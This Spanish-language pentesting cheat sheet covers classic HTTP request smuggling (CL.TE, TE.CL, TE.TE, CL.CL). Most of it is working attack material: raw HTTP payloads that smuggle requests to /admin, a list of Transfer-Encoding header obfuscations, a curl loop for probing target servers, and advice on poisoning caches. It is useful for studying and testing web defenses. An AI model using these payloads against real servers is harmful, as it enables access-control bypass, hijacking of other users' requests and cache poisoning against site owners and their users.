---
aliases:
  - CL.TE
  - TE.CL
  - TE.TE
  - CL.CL
  - Classic Smuggling
tags:
  - type/cheatsheet
  - vuln/http-smuggling
  - technique/initial-access
  - asset/web-app
primary categories: null
secondary categories: null
tertiary categories: null
type: CheatSheet
linked:
  - '[[HTTP Request Smuggling]]'
---
# HTTP Request Smuggling - Variantes Clásicas

***

## CL.TE (Front Content-Length, Back Transfer-Encoding)

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| Concepto | Frontend usa `Content-Length`, backend usa `Transfer-Encoding: chunked`. | Frontend lee body completo según CL → backend interpreta primer chunk + resto como request nuevo. |
| Setup mínimo | `POST / HTTP/1.1\r\nHost: target\r\nContent-Length: <N>\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nSMUGGLED REQUEST` | `0\r\n\r\n` cierra chunked stream para back-end. Resto = smuggled. |
| Smuggle GET | `0\r\n\r\nGET /admin HTTP/1.1\r\nHost: target\r\n\r\n` | Próximo cliente recibe respuesta de `/admin`. |
| Smuggle POST con body | `0\r\n\r\nPOST /admin HTTP/1.1\r\nHost: target\r\nContent-Length: 10\r\n\r\nx=evilbody` | POST con body smuggled. |
| Calcular CL | CL = bytes de TODO lo que viene después de headers + `\r\n\r\n` | Incluye smuggled request entera. |
| Self-poison | Mandar 2 requests propios → segundo recibe efecto del smuggle | Test seguro. |
| Front recibe normal | Para frontend, request es POST a `/` con body que cubre todo. | No detecta nada raro. |
| Back parses chunked | Lee `0\r\n\r\n` → request termina ahí. | Bytes restantes quedan en buffer → siguiente request. |
| Combinar con Connection: keep-alive | `Connection: keep-alive` (default HTTP/1.1) | Necesario para que back mantenga TCP conn abierta y procese siguiente request del buffer. |
| Burp Smuggler aplicar | Right-click → Smuggle attack → CL.TE | Auto-calcula CL. |
^hrs-cl-te

### Ejemplo CL.TE completo

```http
POST / HTTP/1.1
Host: target.com
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED
```

(Asumiendo `\r\n` line endings — `0\r\n\r\nSMUGGLED` = 13 bytes.)

Frontend ve POST con body de 13 bytes. Backend lee `0\r\n\r\n` (terminador chunked) → considera body terminado → trata `SMUGGLED` como inicio de próxima request.

___

## TE.CL (Front Transfer-Encoding, Back Content-Length)

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| Concepto | Frontend usa `Transfer-Encoding: chunked`, backend usa `Content-Length`. | Inverso de CL.TE. |
| Setup mínimo | `POST / HTTP/1.1\r\nHost: target\r\nContent-Length: <small>\r\nTransfer-Encoding: chunked\r\n\r\n<chunk-size>\r\nGPOST / HTTP/1.1\r\n...\r\n0\r\n\r\n` | Más complejo — chunk con request smuggleada adentro. |
| Smuggle estructura | Primer chunk = bytes hasta el final del smuggled. Después `0\r\n\r\n` cierra. | CL del back limita a sólo el chunk-size header. |
| CL del front | Frontend lee chunked completo. CL es ignorado por front. | Para back que lee CL, body es muy chico. |
| Calcular chunk-size | Hex del tamaño del smuggled request en bytes | `\r\n` cuenta. |
| Smuggle GET en TE.CL | `<size-hex>\r\nGET /admin HTTP/1.1\r\nHost: target\r\nFoo: <padding>\r\n\r\n0\r\n\r\n` | Padding para alinear bytes. |
| Bypass CL chico | CL = 4 → back lee `<size-hex>\r\n` (4 chars) → resto del chunk + smuggled queda en buffer | Mecánica clave. |
| Common gotcha | Calcular bytes exactos es delicado — usar Burp Smuggler que calcula auto. | Manual prone-to-error. |
| Combinación con back-end caching | Smuggle a endpoint cacheable → poison cache. | Ver Explotación. |
^hrs-te-cl

### Ejemplo TE.CL completo

```http
POST / HTTP/1.1
Host: target.com
Content-Length: 4
Transfer-Encoding: chunked

5c
GPOST / HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0

```

Frontend ve chunked completo (5c bytes hex = 92 bytes). Backend lee CL=4 → considera body = `5c\r\n` (4 chars) → resto queda como nueva request `GPOST /...`.

___

## TE.TE (Header Obfuscation)

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| Concepto | Ambos servers usan TE pero uno solo respeta una variante ofuscada. | Misma idea que CL.TE/TE.CL pero ambos confunden TE. |
| Obfuscation 1 | `Transfer-Encoding: xchunked` | Front rejecta, back acepta (o viceversa). |
| Obfuscation 2 | `Transfer-Encoding : chunked` (espacio antes de `:`) | RFC permite OWS, parsers difieren. |
| Obfuscation 3 | `Transfer-Encoding:\tchunked` (tab en vez de space) | Same idea. |
| Obfuscation 4 | `Transfer-Encoding\n: chunked` | Header folding obsoleto. |
| Obfuscation 5 | `Transfer-Encoding: chunked\r\nTransfer-Encoding: x` | Doble header — alguno lee primero, otro último. |
| Obfuscation 6 | `Transfer-Encoding: chunked, identity` | Multi-value — depende del parser. |
| Obfuscation 7 | `Transfer-Encoding\x0bchunked` (vertical tab) | Invisible char. |
| Obfuscation 8 | Nombre con UTF-8 weird | `Transfer-Еncoding` (ext Cyrillic E). |
| Doblando case | `transfer-encoding: chunked\r\nTransfer-Encoding: identity` | Algunos parsers son case-sensitive incorrectos. |
| `gzip;chunked` | `Transfer-Encoding: gzip, chunked` | Some servers strip first part, others both. |
^hrs-te-te

### Workflow de descubrimiento TE.TE

```bash
# Probar cada obfuscation hasta encontrar diff de comportamiento
for obfusc in 'xchunked' ' chunked' '\tchunked' 'chunked\r\nTransfer-Encoding: identity'; do
  curl -v --http1.1 \
    -H "Transfer-Encoding: $obfusc" \
    -H "Content-Length: 4" \
    --data-binary $'0\r\n\r\nX' \
    https://target/
done
```

Cuando uno timeoutea y otro no → confirmar TE.TE diferential.

___

## CL.CL (Header Doubling)

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| Concepto | Doble header `Content-Length` con valores distintos — front lee uno, back lee otro. | RFC 7230 §3.3.3 dice rejectar — pero algunos parsers laxos. |
| Setup | `Content-Length: 12\r\nContent-Length: 17\r\n\r\nbody...` | Front lee primero (12), back lee último (17) o viceversa. |
| Smuggle con CL.CL | Body de 12 bytes válido + 5 bytes extra que back interpreta como nuevo request | Misma técnica que CL.TE. |
| Casos donde funciona | nginx + tomcat antiguo, Apache con mod_proxy mal configurado | Raro pero existe. |
| Bypass de filtros que rejectan duplicate headers | Espacios, encoding | Algunos rejectan exact duplicate, no variantes. |
| Combinación con TE | `Content-Length: 5\r\nContent-Length: 10\r\nTransfer-Encoding: chunked\r\n` | Triple confusion. |
^hrs-cl-cl

### Notas sobre CL.CL

- Modernos servers conformantes (nginx, HAProxy, Caddy) **rechazan** duplicates.
- Vector más útil cuando hay múltiples proxies en cadena, alguno de los cuales no rechaza.
- Combinable con TE para forzar paths más raros.

***
